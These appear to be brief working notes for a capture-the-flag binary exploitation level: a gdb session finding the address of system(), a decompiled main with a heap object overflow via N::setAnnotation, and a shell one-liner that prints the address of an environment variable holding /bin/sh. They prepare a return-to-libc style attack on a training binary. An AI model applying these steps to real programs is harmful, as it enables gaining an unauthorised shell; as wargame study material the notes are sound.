on gdb:


(gdb) b main
Breakpoint 1 at 0x80485f8
(gdb) run
Starting program: /home/user/level9/level9 

Breakpoint 1, 0x080485f8 in main ()
(gdb) print system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
\x60\x60\xd8\xb7
/-------------------------------------------------------------/

main disassembly:

    int32_t main(int32_t argc, char** argv, char** envp)

        08048617  if (argc s> 1)
        08048617      int32_t a = operator new(108)
        08048629      N::N(a, 5)
        08048639      int32_t b = operator new(108)
        0804864b      N::N(b, 6)
        0804866a      *(argv + 4)
        08048677      N::setAnnotation(a)
        08048699      return **b(b, a)
        0804860b  _exit(status: 1)
        0804860b  noreturn



There seem to be some class functions for class N
N::N(int)
N::setAnnotation(char*)
N::operator++(N&)
N::operator--(N&)
/-------------------------------------------------------------/

echo 'int main(){printf("%p\n",(void*)getenv("EXPL"));}' > /dev/shm/c.c; gcc /dev/shm/c.c -o /dev/shm/c.out ; export EXPL=/bin/sh; /dev/shm/c.out